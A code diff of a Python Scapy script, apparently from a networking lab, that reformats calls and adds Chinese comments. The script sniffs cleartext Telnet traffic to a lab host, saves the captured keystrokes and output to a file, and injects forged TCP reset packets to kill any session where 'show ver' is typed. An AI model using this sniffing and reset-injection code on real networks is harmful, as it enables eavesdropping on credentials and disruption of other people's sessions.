@@ -31,8 +31,12 @@ def reset_tcp(pkt):
     b = Ether(src=destination_mac, dst=source_mac) / IP(src=destination_ip, dst=source_ip) / TCP(dport=source_port,
                                                                                                  sport=destination_port,
                                                                                                  flags=4, seq=ack_sn)
-    sendp(a, iface='ens33', verbose=False)
-    sendp(b, iface='ens33', verbose=False)
+    sendp(a,
+          # iface='ens33',
+          verbose=False)
+    sendp(b,
+          # iface='ens33',
+          verbose=False)
 
 
 def telnet_monitor_callback(pkt):
@@ -40,16 +44,20 @@ def telnet_monitor_callback(pkt):
     try:
         if pkt.getlayer(TCP).fields['dport'] == 23:
             if pkt.getlayer(Raw).fields['load'].decode():
-                qyt_string = qyt_string + pkt.getlayer(Raw).fields['load']
+                qyt_string = qyt_string + pkt.getlayer(Raw).fields['load']  # 不断提取数据,拼接到qyt_string
     except Exception as e:
         #	#print(e)
         pass
     # print(qyt_string)
-    if re.match(b'(.*\r\n.*)*sh.*\s+ver.*', qyt_string):
+
+    if re.match(b'(.*\r\n.*)*sh.*\s+ver.*', qyt_string):  # 如果出现show ver字段,就Rest踢掉此会话
         reset_tcp(pkt)
 
 
-PTKS = sniff(prn=telnet_monitor_callback, filter="tcp port 23 and ip host 10.1.1.253", store=1, timeout=15,
-             iface='ens33')
+PTKS = sniff(prn=telnet_monitor_callback,
+             filter="tcp port 23 and ip host 10.1.1.253",
+             store=1,
+             # iface='ens33',
+             timeout=15)
 wrpcap("temp.cap", PTKS)
 print(qyt_string)
